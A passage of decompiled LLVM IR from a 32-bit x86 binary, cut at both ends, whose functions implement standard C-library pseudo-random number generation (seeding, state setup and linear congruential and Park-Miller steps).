  %v0_804e853 = load i32, i32* @esi, align 4
  ret i32 %v0_804e853
}

define i32 @function_804e858(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e858:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e858 = load i32, i32* @ebx, align 4
  store i32 %v0_804e858, i32* %stack_var_-4, align 4
  %v2_804e866 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804e866, i32* @ebx, align 4
  %v2_804e86b = call i32 @function_804f016(i32 %v2_804e866, i32 134541331)
  %v1_804e877 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055cc0.162 to i32))
  %v3_804e887 = call i32 @function_804e993(i32 %arg1, i32* nonnull @global_var_8055cd8)
  store i32 ptrtoint (i32* @global_var_8055cd8 to i32), i32* @eax, align 4
  %v2_804e891 = call i32 @function_804f016(i32 %v2_804e866, i32 1)
  %v2_804e899 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e899, i32* @ebx, align 4
  ret i32 %v2_804e891

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8055cd8 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8055cd8, { 0, 1, 3, 2 }
}

define i32 @function_804e89c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804e89c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_804e89f = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_804e8ab = add i32 %tmp3, 12
  %v2_804e8ab = inttoptr i32 %v1_804e8ab to i32*
  %v3_804e8ab = load i32, i32* %v2_804e8ab, align 4
  store i32 %v3_804e8ab, i32* %ecx.global-to-local, align 4
  %v1_804e8ae = add i32 %arg1, 4
  store i32 %v1_804e8ae, i32* %esi.global-to-local, align 4
  %v1_804e8b1 = add i32 %tmp3, 8
  %v2_804e8b1 = inttoptr i32 %v1_804e8b1 to i32*
  %v3_804e8b1 = load i32, i32* %v2_804e8b1, align 4
  %v1_804e8b4 = icmp eq i32 %v3_804e8ab, 0
  %v1_804e8b6 = icmp eq i1 %v1_804e8b4, false
  br i1 %v1_804e8b6, label %dec_label_pc_804e8c1, label %dec_label_pc_804e8b8

dec_label_pc_804e8b8:                             ; preds = %dec_label_pc_804e89c
  %v1_804e8b8 = add i32 %v3_804e8b1, -4
  %v2_804e8b8 = inttoptr i32 %v1_804e8b8 to i32*
  store i32 0, i32* %v2_804e8b8, align 4
  br label %dec_label_pc_804e8d1

dec_label_pc_804e8c1:                             ; preds = %dec_label_pc_804e89c
  %v1_804e8c1 = add i32 %tmp3, 4
  %v2_804e8c1 = inttoptr i32 %v1_804e8c1 to i32*
  %v3_804e8c1 = load i32, i32* %v2_804e8c1, align 4
  %v2_804e8c4 = sub i32 %v3_804e8c1, %v3_804e8b1
  %v2_804e8c6 = sdiv i32 %v2_804e8c4, 4
  %v3_804e8c9 = mul i32 %v2_804e8c6, 5
  %v2_804e8cc = add i32 %v3_804e8c9, %v3_804e8ab
  store i32 %v2_804e8cc, i32* %eax.global-to-local, align 4
  %v2_804e8ce = add i32 %v3_804e8b1, -4
  %v3_804e8ce = inttoptr i32 %v2_804e8ce to i32*
  store i32 %v2_804e8cc, i32* %v3_804e8ce, align 4
  br label %dec_label_pc_804e8d1

dec_label_pc_804e8d1:                             ; preds = %dec_label_pc_804e8b8, %dec_label_pc_804e8c1
  %v0_804e8d1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e8d1 = add i32 %v0_804e8d1, -4
  %v2_804e8d1 = inttoptr i32 %v1_804e8d1 to i32*
  %v3_804e8d1 = load i32, i32* %v2_804e8d1, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804e8d9 = ashr i32 %v3_804e8d1, 31
  %v2_804e8da = zext i32 %v3_804e8d1 to i64
  %v4_804e8da = zext i32 %v1_804e8d9 to i64
  %v5_804e8da = mul nuw i64 %v4_804e8da, 4294967296
  %v6_804e8da = or i64 %v5_804e8da, %v2_804e8da
  %v8_804e8da = sdiv i64 %v6_804e8da, 5
  %v9_804e8da = trunc i64 %v8_804e8da to i32
  store i32 %v9_804e8da, i32* %eax.global-to-local, align 4
  %v10_804e8da = srem i64 %v6_804e8da, 5
  %v11_804e8da = trunc i64 %v10_804e8da to i32
  %v6_804e8df = icmp ugt i32 %v11_804e8da, 4
  br i1 %v6_804e8df, label %dec_label_pc_804e91f, label %dec_label_pc_804e8e1

dec_label_pc_804e8e1:                             ; preds = %dec_label_pc_804e8d1
  %v1_804e8e1 = mul i32 %v11_804e8da, 4
  %v2_804e8e1 = add i32 %v1_804e8e1, ptrtoint (i32* @global_var_8054014.167 to i32)
  %v3_804e8e1 = inttoptr i32 %v2_804e8e1 to i32*
  %v4_804e8e1 = load i32, i32* %v3_804e8e1, align 4
  store i32 %v4_804e8e1, i32* %ecx.global-to-local, align 4
  %v1_804e8e8 = icmp eq i32 %v11_804e8da, 0
  %v2_804e8ea = add i32 %v1_804e8e1, ptrtoint (i32* @global_var_8054000.168 to i32)
  %v3_804e8ea = inttoptr i32 %v2_804e8ea to i32*
  %v4_804e8ea = load i32, i32* %v3_804e8ea, align 4
  store i32 %v4_804e8ea, i32* %ebp.global-to-local, align 4
  %v1_804e8f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e8f1 = add i32 %v1_804e8f1, 12
  %v3_804e8f1 = inttoptr i32 %v2_804e8f1 to i32*
  store i32 %v11_804e8da, i32* %v3_804e8f1, align 4
  %v0_804e8f4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e8f4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e8f4 = add i32 %v1_804e8f4, 16
  %v3_804e8f4 = inttoptr i32 %v2_804e8f4 to i32*
  store i32 %v0_804e8f4, i32* %v3_804e8f4, align 4
  %v0_804e8f7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e8f7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e8f7 = add i32 %v1_804e8f7, 20
  %v3_804e8f7 = inttoptr i32 %v2_804e8f7 to i32*
  store i32 %v0_804e8f7, i32* %v3_804e8f7, align 4
  br i1 %v1_804e8e8, label %dec_label_pc_804e912, label %dec_label_pc_804e8fc

dec_label_pc_804e8fc:                             ; preds = %dec_label_pc_804e8e1
  %v0_804e8fc = load i32, i32* %esi.global-to-local, align 4
  %v1_804e8fc = add i32 %v0_804e8fc, -4
  %v2_804e8fc = inttoptr i32 %v1_804e8fc to i32*
  %v3_804e8fc = load i32, i32* %v2_804e8fc, align 4
  %v1_804e8ff = ashr i32 %v3_804e8fc, 31
  %v0_804e900 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e900 = zext i32 %v3_804e8fc to i64
  %v4_804e900 = zext i32 %v1_804e8ff to i64
  %v5_804e900 = mul nuw i64 %v4_804e900, 4294967296
  %v6_804e900 = or i64 %v5_804e900, %v2_804e900
  %v7_804e900 = zext i32 %v0_804e900 to i64
  %v8_804e900 = sdiv i64 %v6_804e900, %v7_804e900
  %v9_804e900 = trunc i64 %v8_804e900 to i32
  %v2_804e902 = mul i32 %v9_804e900, 4
  %v3_804e902 = add i32 %v2_804e902, %v0_804e8fc
  %v1_804e905 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e905 = add i32 %v1_804e905, %v9_804e900
  store i32 %v2_804e905, i32* %eax.global-to-local, align 4
  %v1_804e907 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e907 = add i32 %v1_804e907, 4
  %v3_804e907 = inttoptr i32 %v2_804e907 to i32*
  store i32 %v3_804e902, i32* %v3_804e907, align 4
  %v0_804e90a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e90a = ashr i32 %v0_804e90a, 31
  %v0_804e90b = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e90b = zext i32 %v0_804e90a to i64
  %v4_804e90b = zext i32 %v1_804e90a to i64
  %v5_804e90b = mul nuw i64 %v4_804e90b, 4294967296
  %v6_804e90b = or i64 %v5_804e90b, %v2_804e90b
  %v7_804e90b = zext i32 %v0_804e90b to i64
  %v8_804e90b = sdiv i64 %v6_804e90b, %v7_804e90b
  %v9_804e90b = trunc i64 %v8_804e90b to i32
  store i32 %v9_804e90b, i32* %eax.global-to-local, align 4
  %v10_804e90b = srem i64 %v6_804e90b, %v7_804e90b
  %v11_804e90b = trunc i64 %v10_804e90b to i32
  %v0_804e90d = load i32, i32* %esi.global-to-local, align 4
  %v2_804e90d = mul i32 %v11_804e90b, 4
  %v3_804e90d = add i32 %v2_804e90d, %v0_804e90d
  %v1_804e910 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e910 = inttoptr i32 %v1_804e910 to i32*
  store i32 %v3_804e90d, i32* %v2_804e910, align 4
  br label %dec_label_pc_804e912

dec_label_pc_804e912:                             ; preds = %dec_label_pc_804e8e1, %dec_label_pc_804e8fc
  %v0_804e912 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e912 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e912 = mul i32 %v1_804e912, 4
  %v3_804e912 = add i32 %v2_804e912, %v0_804e912
  %v1_804e915 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e915 = add i32 %v1_804e915, 24
  %v3_804e915 = inttoptr i32 %v2_804e915 to i32*
  store i32 %v3_804e912, i32* %v3_804e915, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e91a = load i32, i32* %esi.global-to-local, align 4
  %v1_804e91a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e91a = add i32 %v1_804e91a, 8
  %v3_804e91a = inttoptr i32 %v2_804e91a to i32*
  store i32 %v0_804e91a, i32* %v3_804e91a, align 4
  %v0_804e934.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e92d

dec_label_pc_804e91f:                             ; preds = %dec_label_pc_804e8d1
  %v1_804e91f = call i32 @function_804b7f4(i32 %v0_804e89f)
  %v1_804e924 = inttoptr i32 %v1_804e91f to i32*
  store i32 22, i32* %v1_804e924, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e92d

dec_label_pc_804e92d:                             ; preds = %dec_label_pc_804e912, %dec_label_pc_804e91f
  %v0_804e934 = phi i32 [ %v0_804e934.pre, %dec_label_pc_804e912 ], [ -1, %dec_label_pc_804e91f ]
  store i32 %v0_804e89f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804e934

; uselistorder directives
  uselistorder i32 %v11_804e8da, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e92d, { 1, 0 }
  uselistorder label %dec_label_pc_804e912, { 1, 0 }
  uselistorder label %dec_label_pc_804e8d1, { 1, 0 }
}

define i32 @function_804e935(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804e935:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804e938 = load i32, i32* @ebx, align 4
  store i32 %v0_804e938, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804e941 = add i32 %tmp3, 12
  %v2_804e941 = inttoptr i32 %v1_804e941 to i32*
  %v3_804e941 = load i32, i32* %v2_804e941, align 4
  %v4_804e941 = icmp eq i32 %v3_804e941, 0
  %v1_804e945 = add i32 %tmp3, 8
  %v2_804e945 = inttoptr i32 %v1_804e945 to i32*
  %v3_804e945 = load i32, i32* %v2_804e945, align 4
  store i32 %v3_804e945, i32* %esi.global-to-local, align 4
  %v1_804e948 = icmp eq i1 %v4_804e941, false
  br i1 %v1_804e948, label %dec_label_pc_804e961, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e935
  %v2_804e94a = inttoptr i32 %v3_804e945 to i32*
  %v3_804e94a = load i32, i32* %v2_804e94a, align 4
  %v5_804e94a = mul i32 %v3_804e94a, 1103515245
  %v1_804e950 = add i32 %v5_804e94a, 12345
  %v1_804e955 = urem i32 %v1_804e950, -2147483648
  store i32 %v1_804e955, i32* %eax.global-to-local, align 4
  store i32 %v1_804e955, i32* %v2_804e94a, align 4
  %v0_804e95c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e95c = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e95c = inttoptr i32 %v1_804e95c to i32*
  store i32 %v0_804e95c, i32* %v2_804e95c, align 4
  br label %dec_label_pc_804e98c

dec_label_pc_804e961:                             ; preds = %dec_label_pc_804e935
  %v1_804e961 = add i32 %tmp3, 4
  %v2_804e961 = inttoptr i32 %v1_804e961 to i32*
  %v3_804e961 = load i32, i32* %v2_804e961, align 4
  store i32 %v3_804e961, i32* %ecx.global-to-local, align 4
  %v2_804e964 = load i32, i32* %arg1, align 4
  store i32 %v2_804e964, i32* %edx.global-to-local, align 4
  %v1_804e966 = add i32 %tmp3, 24
  %v2_804e966 = inttoptr i32 %v1_804e966 to i32*
  %v3_804e966 = load i32, i32* %v2_804e966, align 4
  store i32 %v3_804e966, i32* %edi.global-to-local, align 4
  %v1_804e969 = inttoptr i32 %v3_804e961 to i32*
  %v2_804e969 = load i32, i32* %v1_804e969, align 4
  store i32 %v2_804e969, i32* %eax.global-to-local, align 4
  %v1_804e96b = inttoptr i32 %v2_804e964 to i32*
  %v2_804e96b = load i32, i32* %v1_804e96b, align 4
  %v4_804e96b = add i32 %v2_804e96b, %v2_804e969
  store i32 %v4_804e96b, i32* %v1_804e96b, align 4
  %v0_804e96d = load i32, i32* %edx.global-to-local, align 4
  %v1_804e96d = inttoptr i32 %v0_804e96d to i32*
  %v2_804e96d = load i32, i32* %v1_804e96d, align 4
  %v1_804e96f = add i32 %v0_804e96d, 4
  store i32 %v1_804e96f, i32* %edx.global-to-local, align 4
  %v2_804e972 = udiv i32 %v2_804e96d, 2
  %v1_804e974 = load i32, i32* %edi.global-to-local, align 4
  %v7_804e974 = icmp ult i32 %v1_804e96f, %v1_804e974
  %v1_804e976 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e976 = inttoptr i32 %v1_804e976 to i32*
  store i32 %v2_804e972, i32* %v2_804e976, align 4
  %v0_804e979 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e979 = add i32 %v0_804e979, 4
  store i32 %v1_804e979, i32* %eax.global-to-local, align 4
  br i1 %v7_804e974, label %dec_label_pc_804e982, label %dec_label_pc_804e97e

dec_label_pc_804e97e:                             ; preds = %dec_label_pc_804e961
  %v0_804e97e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804e97e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e987

dec_label_pc_804e982:                             ; preds = %dec_label_pc_804e961
  %v1_804e982 = load i32, i32* %edi.global-to-local, align 4
  %v7_804e982 = icmp ult i32 %v1_804e979, %v1_804e982
  %v1_804e984 = icmp eq i1 %v7_804e982, false
  %v3_804e984 = load i32, i32* %esi.global-to-local, align 4
  %v4_804e984 = select i1 %v1_804e984, i32 %v3_804e984, i32 %v1_804e979
  store i32 %v4_804e984, i32* %eax.global-to-local, align 4
  %v0_804e987.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e987

dec_label_pc_804e987:                             ; preds = %dec_label_pc_804e97e, %dec_label_pc_804e982
  %v0_804e987 = phi i32 [ %v0_804e97e, %dec_label_pc_804e97e ], [ %v0_804e987.pre, %dec_label_pc_804e982 ]
  %v1_804e987 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e987 = inttoptr i32 %v1_804e987 to i32*
  store i32 %v0_804e987, i32* %v2_804e987, align 4
  %v0_804e989 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e989 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e989 = add i32 %v1_804e989, 4
  %v3_804e989 = inttoptr i32 %v2_804e989 to i32*
  store i32 %v0_804e989, i32* %v3_804e989, align 4
  br label %dec_label_pc_804e98c

dec_label_pc_804e98c:                             ; preds = %dec_label_pc_804e94a, %dec_label_pc_804e987
  %v2_804e98c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e98c, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804e955, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804e98c, { 1, 0 }
  uselistorder label %dec_label_pc_804e987, { 1, 0 }
}

define i32 @function_804e993(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804e993:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804e993 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804e997 = load i32, i32* @edi, align 4
  %v0_804e998 = load i32, i32* @esi, align 4
  %v0_804e999 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804e9a5 = add i32 %tmp14, 12
  %v2_804e9a5 = inttoptr i32 %v1_804e9a5 to i32*
  %v3_804e9a5 = load i32, i32* %v2_804e9a5, align 4
  store i32 %v3_804e9a5, i32* %ecx.global-to-local, align 4
  %v6_804e9ab = icmp ugt i32 %v3_804e9a5, 4
  br i1 %v6_804e9ab, label %dec_label_pc_804ea25, label %dec_label_pc_804e9ad

dec_label_pc_804e9ad:                             ; preds = %dec_label_pc_804e993
  %v1_804e9ad = add i32 %tmp14, 8
  %v2_804e9ad = inttoptr i32 %v1_804e9ad to i32*
  %v3_804e9ad = load i32, i32* %v2_804e9ad, align 4
  store i32 %v3_804e9ad, i32* %ebx.global-to-local, align 4
  %v1_804e9b0 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_804e9b7 = select i1 %v1_804e9b0, i32 1, i32 %arg1
  store i32 %v3_804e9b7, i32* %edx.global-to-local, align 4
  %v1_804e9ba = icmp eq i32 %v3_804e9a5, 0
  %v2_804e9bc = inttoptr i32 %v3_804e9ad to i32*
  store i32 %v3_804e9b7, i32* %v2_804e9bc, align 4
  br i1 %v1_804e9ba, label %dec_label_pc_804ea23, label %dec_label_pc_804e9c0

dec_label_pc_804e9c0:                             ; preds = %dec_label_pc_804e9ad
  %v0_804e9c0 = load i32, i32* @esi, align 4
  %v1_804e9c0 = add i32 %v0_804e9c0, 16
  %v2_804e9c0 = inttoptr i32 %v1_804e9c0 to i32*
  %v3_804e9c0 = load i32, i32* %v2_804e9c0, align 4
  store i32 %v3_804e9c0, i32* %eax.global-to-local, align 4
  %v0_804e9c3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e9c3, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_804e9ca = sext i32 %v3_804e9c0 to i64
  store i64 %v4_804e9ca, i64* %stack_var_-40, align 8
  %v5_804ea0029 = icmp sgt i32 %v3_804e9c0, 1
  br i1 %v5_804ea0029, label %dec_label_pc_804e9cf, label %dec_label_pc_804ea02

dec_label_pc_804e9cf:                             ; preds = %dec_label_pc_804e9c0, %dec_label_pc_804e9cf.dec_label_pc_804e9cf_crit_edge
  %v0_804e9f7 = phi i32 [ %v0_804e9f7.pre, %dec_label_pc_804e9cf.dec_label_pc_804e9cf_crit_edge ], [ %v0_804e9c3, %dec_label_pc_804e9c0 ]
  %v0_804e9cf = load i32, i32* %edx.global-to-local, align 4
  %v1_804e9d6 = ashr i32 %v0_804e9cf, 31
  %v2_804e9d7 = zext i32 %v0_804e9cf to i64
  %v4_804e9d7 = zext i32 %v1_804e9d6 to i64
  %v5_804e9d7 = mul nuw i64 %v4_804e9d7, 4294967296
  %v6_804e9d7 = or i64 %v5_804e9d7, %v2_804e9d7
  %v8_804e9d7 = sdiv i64 %v6_804e9d7, 127773
  %v9_804e9d7 = trunc i64 %v8_804e9d7 to i32
  %v10_804e9d7 = srem i64 %v6_804e9d7, 127773
  %v3_804e9dd = mul nsw i64 %v10_804e9d7, 16807
  %v4_804e9dd = trunc i64 %v3_804e9dd to i32
  %tmp24 = mul i32 %v9_804e9d7, -2836
  %v2_804e9e9 = add i32 %v4_804e9dd, %tmp24
  %v1_804e9eb = add i32 %v2_804e9e9, 1
  %v6_804e9eb = xor i32 %v2_804e9e9, -2147483648
  %v7_804e9eb = xor i32 %v1_804e9eb, %v2_804e9e9
  %v8_804e9eb = and i32 %v7_804e9eb, %v6_804e9eb
  %v9_804e9eb = icmp slt i32 %v8_804e9eb, 0
  %v10_804e9eb = icmp eq i32 %v1_804e9eb, 0
  %v11_804e9eb = icmp slt i32 %v1_804e9eb, 0
  %v1_804e9ee = add i32 %v2_804e9e9, 2147483647
  store i32 %v1_804e9ee, i32* %eax.global-to-local, align 4
  %v3_804e9f4 = icmp ne i1 %v11_804e9eb, %v9_804e9eb
  %v4_804e9f4 = or i1 %v10_804e9eb, %v3_804e9f4
  %v7_804e9f4 = select i1 %v4_804e9f4, i32 %v1_804e9ee, i32 %v2_804e9e9
  store i32 %v7_804e9f4, i32* %edx.global-to-local, align 4
  %v1_804e9f7 = add i32 %v0_804e9f7, 4
  store i32 %v1_804e9f7, i32* %ecx.global-to-local, align 4
  %v2_804e9fa = inttoptr i32 %v1_804e9f7 to i32*
  store i32 %v7_804e9f4, i32* %v2_804e9fa, align 4
  %v0_804e9fc = load i32, i32* @edi, align 4
  %v1_804e9fc = add i32 %v0_804e9fc, 1
  store i32 %v1_804e9fc, i32* @edi, align 4
  %v3_804e9fd.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_804e9fd.pre to i32
  %v5_804ea00 = icmp slt i32 %v1_804e9fc, %extract.t11
  br i1 %v5_804ea00, label %dec_label_pc_804e9cf.dec_label_pc_804e9cf_crit_edge, label %dec_label_pc_804e9fd.dec_label_pc_804ea02_crit_edge

dec_label_pc_804e9cf.dec_label_pc_804e9cf_crit_edge: ; preds = %dec_label_pc_804e9cf
  %v0_804e9f7.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e9cf

dec_label_pc_804e9fd.dec_label_pc_804ea02_crit_edge: ; preds = %dec_label_pc_804e9cf
  %v0_804ea02.pre = load i32, i32* @esi, align 4
  %v0_804ea05.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ea02

dec_label_pc_804ea02:                             ; preds = %dec_label_pc_804e9fd.dec_label_pc_804ea02_crit_edge, %dec_label_pc_804e9c0
  %v0_804ea05 = phi i32 [ %v0_804ea05.pre, %dec_label_pc_804e9fd.dec_label_pc_804ea02_crit_edge ], [ %v0_804e9c3, %dec_label_pc_804e9c0 ]
  %v0_804ea02 = phi i32 [ %v0_804ea02.pre, %dec_label_pc_804e9fd.dec_label_pc_804ea02_crit_edge ], [ %v0_804e9c0, %dec_label_pc_804e9c0 ]
  %v1_804ea02 = add i32 %v0_804ea02, 20
  %v2_804ea02 = inttoptr i32 %v1_804ea02 to i32*
  %v3_804ea02 = load i32, i32* %v2_804ea02, align 4
  store i32 %v3_804ea02, i32* %eax.global-to-local, align 4
  %v2_804ea05 = add i32 %v0_804ea02, 4
  %v3_804ea05 = inttoptr i32 %v2_804ea05 to i32*
  store i32 %v0_804ea05, i32* %v3_804ea05, align 4
  %v0_804ea08 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ea08 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ea08 = mul i32 %v1_804ea08, 4
  %v3_804ea08 = add i32 %v2_804ea08, %v0_804ea08
  store i32 %v3_804ea08, i32* %eax.global-to-local, align 4
  %v1_804ea0b = load i32, i32* @esi, align 4
  %v2_804ea0b = inttoptr i32 %v1_804ea0b to i32*
  store i32 %v3_804ea08, i32* %v2_804ea0b, align 4
  %v3_804ea0d = load i64, i64* %stack_var_-40, align 8
  %v6_804ea0d = mul nsw i64 %v3_804ea0d, 10
  %v7_804ea0d = trunc i64 %v6_804ea0d to i32
  %v2_804ea13 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ea2025 = add i32 %v7_804ea0d, -1
  %v9_804ea2026 = icmp slt i32 %v1_804ea2025, 0
  store i32 %v1_804ea2025, i32* @ebx, align 4
  %v1_804ea2127 = icmp eq i1 %v9_804ea2026, false
  br i1 %v1_804ea2127, label %dec_label_pc_804ea13, label %dec_label_pc_804ea23

dec_label_pc_804ea13:                             ; preds = %dec_label_pc_804ea02, %dec_label_pc_804ea13
  store i32 %v2_804ea13, i32* %eax.global-to-local, align 4
  %v0_804ea18 = load i32, i32* @esi, align 4
  %v2_804ea19 = inttoptr i32 %v0_804ea18 to i32*
  %v3_804ea19 = call i32 @function_804e935(i32* %v2_804ea19, i32 %v2_804ea13)
  store i32 %v0_804ea18, i32* %eax.global-to-local, align 4
  store i32 %v2_804ea13, i32* %edx.global-to-local, align 4
  %v0_804ea20.pre = load i32, i32* @ebx, align 4
  %v1_804ea20 = add i32 %v0_804ea20.pre, -1
  %v9_804ea20 = icmp slt i32 %v1_804ea20, 0
  store i32 %v1_804ea20, i32* @ebx, align 4
  %v1_804ea21 = icmp eq i1 %v9_804ea20, false
  br i1 %v1_804ea21, label %dec_label_pc_804ea13, label %dec_label_pc_804ea23

dec_label_pc_804ea23:                             ; preds = %dec_label_pc_804ea02, %dec_label_pc_804ea13, %dec_label_pc_804e9ad
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea25

dec_label_pc_804ea25:                             ; preds = %dec_label_pc_804e993, %dec_label_pc_804ea23
  %v0_804ea2c = phi i32 [ -1, %dec_label_pc_804e993 ], [ 0, %dec_label_pc_804ea23 ]
  store i32 %v0_804e999, i32* @ebx, align 4
  store i32 %v0_804e998, i32* @esi, align 4
  store i32 %v0_804e997, i32* @edi, align 4
  store i32 %v0_804e993, i32* @ebp, align 4
  ret i32 %v0_804ea2c

; uselistorder directives
  uselistorder i32 %v1_804ea20, { 1, 0 }
  uselistorder i32 %v0_804ea02, { 1, 0 }
  uselistorder i32 %v1_804e9eb, { 2, 1, 0 }
  uselistorder i32 %v2_804e9e9, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_804e9c3, { 1, 0, 2 }
  uselistorder i32 %v3_804e9a5, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_804ea25, { 1, 0 }
  uselistorder label %dec_label_pc_804ea23, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ea13, { 1, 0 }
  uselistorder label %dec_label_pc_804e9cf, { 1, 0 }
}

define i32 @function_804ea2d(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ea2d:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804ea2f = load i32, i32* @esi, align 4
  %v0_804ea30 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_804ea51, label %dec_label_pc_804ea45

dec_label_pc_804ea45:                             ; preds = %dec_label_pc_804ea2d
  %v2_804ea45 = icmp ult i32 %arg3, 256
  %v1_804ea4c = select i1 %v2_804ea45, i32 5, i32 4
  store i32 %v1_804ea4c, i32* @ebx, align 4
  br label %dec_label_pc_804ea67

dec_label_pc_804ea51:                             ; preds = %dec_label_pc_804ea2d
  %v6_804ea54 = icmp ugt i32 %arg3, 31
  br i1 %v6_804ea54, label %dec_label_pc_804ea5f, label %dec_label_pc_804ea56

dec_label_pc_804ea56:                             ; preds = %dec_label_pc_804ea51
  store i32 0, i32* @ebx, align 4
  %v6_804ea5b = icmp ugt i32 %arg3, 7
  br i1 %v6_804ea5b, label %dec_label_pc_804ea67, label %dec_label_pc_804eab7

dec_label_pc_804ea5f:                             ; preds = %dec_label_pc_804ea51
  %v2_804ea5f = icmp ult i32 %arg3, 64
  %v1_804ea64 = select i1 %v2_804ea5f, i32 3, i32 2
  store i32 %v1_804ea64, i32* @ebx, align 4
  br label %dec_label_pc_804ea67

dec_label_pc_804ea67:                             ; preds = %dec_label_pc_804ea56, %dec_label_pc_804ea45, %dec_label_pc_804ea5f
